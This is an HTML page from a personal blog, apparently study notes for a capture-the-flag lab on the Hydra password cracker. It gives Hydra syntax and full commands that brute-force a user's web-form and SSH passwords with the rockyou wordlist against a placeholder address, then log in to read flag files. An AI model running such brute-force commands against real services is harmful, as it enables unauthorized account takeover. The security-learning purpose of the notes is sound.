@@ -1,0 +1,328 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en"><head>
+
+<meta charset="utf-8">
+<meta name="generator" content="quarto-0.9.334">
+
+<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+
+<meta name="author" content="hacker_newb">
+<meta name="dcterms.date" content="2023-08-01">
+
+<title>hacking newb - Hydra</title>
+<style>
+code{white-space: pre-wrap;}
+span.smallcaps{font-variant: small-caps;}
+span.underline{text-decoration: underline;}
+div.column{display: inline-block; vertical-align: top; width: 50%;}
+div.hanging-indent{margin-left: 1.5em; text-indent: -1.5em;}
+ul.task-list{list-style: none;}
+</style>
+
+<script src="../../site_libs/quarto-nav/quarto-nav.js"></script>
+<script src="../../site_libs/quarto-nav/headroom.min.js"></script>
+<script src="../../site_libs/clipboard/clipboard.min.js"></script>
+<meta name="quarto:offset" content="../../">
+<script src="../../site_libs/quarto-search/autocomplete.umd.js"></script>
+<script src="../../site_libs/quarto-search/fuse.min.js"></script>
+<script src="../../site_libs/quarto-search/quarto-search.js"></script>
+<script src="../../site_libs/quarto-html/quarto.js"></script>
+<script src="../../site_libs/quarto-html/popper.min.js"></script>
+<script src="../../site_libs/quarto-html/tippy.umd.min.js"></script>
+<script src="../../site_libs/quarto-html/anchor.min.js"></script>
+<link href="../../site_libs/quarto-html/tippy.css" rel="stylesheet">
+<link id="quarto-text-highlighting-styles" href="../../site_libs/quarto-html/quarto-syntax-highlighting-dark.css" rel="stylesheet">
+<script src="../../site_libs/bootstrap/bootstrap.min.js"></script>
+<link href="../../site_libs/bootstrap/bootstrap-icons.css" rel="stylesheet">
+<link href="../../site_libs/bootstrap/bootstrap.min.css" rel="stylesheet">
+<script id="quarto-search-options" type="application/json">{
+  "location": "navbar",
+  "copy-button": false,
+  "collapse-after": 3,
+  "panel-placement": "end",
+  "type": "overlay",
+  "limit": 20,
+  "language": {
+    "search-no-results-text": "No results",
+    "search-matching-documents-text": "matching documents",
+    "search-copy-link-title": "Copy link to search",
+    "search-hide-matches-text": "Hide additional matches",
+    "search-more-match-text": "more match in this document",
+    "search-more-matches-text": "more matches in this document",
+    "search-clear-button-title": "Clear",
+    "search-detached-cancel-button-title": "Cancel",
+    "search-submit-button-title": "Submit"
+  }
+}</script>
+
+
+<link rel="stylesheet" href="../../styles.css">
+</head>
+
+<body class="nav-fixed fullcontent">
+
+<div id="quarto-search-results"></div>
+  <header id="quarto-header" class="headroom fixed-top">
+    <nav class="navbar navbar-expand-lg navbar-dark ">
+      <div class="navbar-container container-fluid">
+      <a class="navbar-brand" href="../../index.html">
+    <span class="navbar-title">hacking newb</span>
+  </a>
+          <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarCollapse" aria-controls="navbarCollapse" aria-expanded="false" aria-label="Toggle navigation" onclick="if (window.quartoToggleHeadroom) { window.quartoToggleHeadroom(); }">
+  <span class="navbar-toggler-icon"></span>
+</button>
+          <div class="collapse navbar-collapse" id="navbarCollapse">
+            <ul class="navbar-nav navbar-nav-scroll ms-auto">
+  <li class="nav-item">
+    <a class="nav-link" href="../../about.html">About</a>
+  </li>  
+  <li class="nav-item">
+    <a class="nav-link" href="../../reference.html">References</a>
+  </li>  
+  <li class="nav-item compact">
+    <a class="nav-link" href="https://github.com/"><i class="bi bi-github" role="img">
+</i> 
+ </a>
+  </li>  
+  <li class="nav-item compact">
+    <a class="nav-link" href="https://infosec.exchange/@hacker_newb"><i class="bi bi-mastodon" role="img">
+</i> 
+ </a>
+  </li>  
+</ul>
+              <div id="quarto-search" class="" title="Search"></div>
+          </div> <!-- /navcollapse -->
+      </div> <!-- /container-fluid -->
+    </nav>
+</header>
+<!-- content -->
+<header id="title-block-header" class="quarto-title-block default page-columns page-full">
+  <div class="quarto-title-banner page-columns page-full">
+    <div class="quarto-title column-body">
+      <h1 class="title">Hydra</h1>
+                          <div class="quarto-categories">
+                <div class="quarto-category">hashes</div>
+                <div class="quarto-category">password</div>
+              </div>
+                  </div>
+  </div>
+    
+  
+
+
+
+  <div class="quarto-title-meta">
+
+      <div>
+      <div class="quarto-title-meta-heading">Author</div>
+      <div class="quarto-title-meta-contents">
+               <p>hacker_newb </p>
+            </div>
+    </div>
+      
+      <div>
+      <div class="quarto-title-meta-heading">Published</div>
+      <div class="quarto-title-meta-contents">
+        <p class="date">August 1, 2023</p>
+      </div>
+    </div>
+      
+    </div>
+    
+  
+  </header><div id="quarto-content" class="quarto-container page-columns page-rows-contents page-layout-article page-navbar">
+<!-- sidebar -->
+<!-- margin-sidebar -->
+    
+<!-- main -->
+<main class="content quarto-banner-title-block" id="quarto-document-content">
+
+
+
+
+<p>Hydra is a brute force online password cracking program, a quick system login password “hacking” tool.</p>
+<section id="hydra" class="level2">
+<h2 class="anchored" data-anchor-id="hydra">Hydra</h2>
+<p>Hydra can run through a list and “brute force” some authentication services. Imagine trying to manually guess someone’s password on a particular service (SSH, Web Application Form, FTP or SNMP) - we can use Hydra to run through a password list and speed this process up for us, determining the correct password.</p>
+<ul>
+<li>you can use a whole bunch of protocols (FTP,HTTP,IRC,SSH, POP3, etc) to brute force</li>
+</ul>
+<p>This shows the importance of using a strong password; if your password is common, doesn’t contain special characters and is not above eight characters, it will be prone to be guessed. A one-hundred-million-password list contains common passwords, so when an out-of-the-box application uses an easy password to log in, change it from the default! CCTV cameras and web frameworks often use <code>admin:password</code> as the default login credentials, which is obviously not strong enough.</p>
+<ul>
+<li>hydra is installed in Kali</li>
+<li><code>sudo apt install hydra</code></li>
+</ul>
+</section>
+<section id="task-2" class="level2">
+<h2 class="anchored" data-anchor-id="task-2">Task 2</h2>
+<p>Hydra commands <code>hydra -l &lt;USERNAM&gt; -P &lt;PATH TO PASSWORDS&gt; IP_address -t &lt;NUM&gt; &lt;PROTOCOL&gt;</code>.</p>
+<table class="table">
+<thead>
+<tr class="header">
+<th>option</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>-l</code></td>
+<td>username login</td>
+</tr>
+<tr class="even">
+<td><code>-P</code></td>
+<td>list of passwords</td>
+</tr>
+<tr class="odd">
+<td><code>-t</code></td>
+<td>number of threads</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><p>brute force FTP, username is ‘user’ and using a password list (passwordlist.txt) then syntax <code>hydra -l user -P passwordlist.txt ftp://IP_address</code></p></li>
+<li><p>brute force SSH, <code>hydra -l root -P passwords.txt IP_address -t 4 ssh</code></p></li>
+<li><p>brute force web forms, must know the type of request GET/POST, can see source code to see request types</p></li>
+</ul>
+<p>Web Form</p>
+<table class="table">
+<thead>
+<tr class="header">
+<th>option</th>
+<th>description</th>
+</tr>
+</thead>
+<tbody>
+<tr class="odd">
+<td><code>-l</code></td>
+<td>username for login</td>
+</tr>
+<tr class="even">
+<td><code>-P</code></td>
+<td>password list</td>
+</tr>
+<tr class="odd">
+<td><code>http-post-form</code></td>
+<td>POST form</td>
+</tr>
+<tr class="even">
+<td><code>&lt;path&gt;</code></td>
+<td>login URL (login.php)</td>
+</tr>
+<tr class="odd">
+<td><code>&lt;login_creds&gt;</code></td>
+<td><code>username=^USER&amp;password^PASS^</code></td>
+</tr>
+<tr class="even">
+<td><code>&lt;invalid_cred&gt;</code></td>
+<td>login fail response</td>
+</tr>
+<tr class="odd">
+<td><code>-v</code></td>
+<td>verbose output for every attempt</td>
+</tr>
+</tbody>
+</table>
+<ul>
+<li><code>sudo hydra USERNAME WORDLIST IP_address http-post-form "&lt;PATH&gt;:&lt;login_creds&gt;:&lt;invalid_cred&gt;"</code></li>
+<li></li>
+</ul>
+<p>Inside the AttackBox, go to IP_address and see a Username and Password login form.</p>
+<p>Question: <em>Use Hydra to bruteforce molly’s web password. What is flag 1?</em></p>
+<ul>
+<li><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_address http-post-form "/login:username=^USER^&amp;password=^PASS^:Your username or password is incorrect" -V</code></li>
+<li>hydra quickly finds the password and you can login and get the flag</li>
+</ul>
+<p>Question: <em>Use Hydra to bruteforce molly’s SSH password. What is flag 2?</em></p>
+<ul>
+<li><code>hydra -l molly -P /usr/share/wordlists/rockyou.txt IP_address ssh</code></li>
+<li><code>ssh molly@IP_address</code> &gt; <code>ls</code> &gt; <code>cat flag2.txt</code> and get the flag</li>
+</ul>
+
+
+</section>
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const clipboard = new window.ClipboardJS('.code-copy-button', {
+    target: function(trigger) {
+      return trigger.previousElementSibling;
+    }
+  });
+  clipboard.on('success', function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    setTimeout(function() {
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  });
+  function tippyHover(el, contentFn) {
+    const config = {
+      allowHTML: true,
+      content: contentFn,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start'
+    };
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      let href = ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      return note.innerHTML;
+    });
+  }
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const cites = ref.parentNode.getAttribute('data-cites').split(' ');
+    tippyHover(ref, function() {
+      var popup = window.document.createElement('div');
+      cites.forEach(function(cite) {
+        var citeDiv = window.document.createElement('div');
+        citeDiv.classList.add('hanging-indent');
+        citeDiv.classList.add('csl-entry');
+        var biblioDiv = window.document.getElementById('ref-' + cite);
+        if (biblioDiv) {
+          citeDiv.innerHTML = biblioDiv.innerHTML;
+        }
+        popup.appendChild(citeDiv);
+      });
+      return popup.innerHTML;
+    });
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+</body></html>
